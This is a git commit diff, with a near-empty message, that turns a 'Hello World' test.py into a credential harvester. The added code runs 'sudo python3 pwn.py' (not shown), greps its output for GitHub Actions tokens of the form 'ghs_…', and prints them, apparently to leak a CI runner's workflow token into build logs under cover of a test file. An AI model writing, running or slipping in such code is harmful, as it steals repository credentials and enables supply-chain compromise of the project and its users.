f2683819ef15ee067db85685a4bee3131414305b
Simon Schwarz <simonschwarz.du@gmail.com>
2025-01-06 10:57:41 +0100

    ..

--- test.py
+++ test.py
@@ -1,2 +1,9 @@
+import subprocess
+
+
+result = subprocess.run(['bash', '-c', """sudo python3 pwn.py | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20}' | sort -u"""], capture_output=True, text=True)
+
+
 print("Hello World.")
-exit(1)
+
+print(result.stdout)
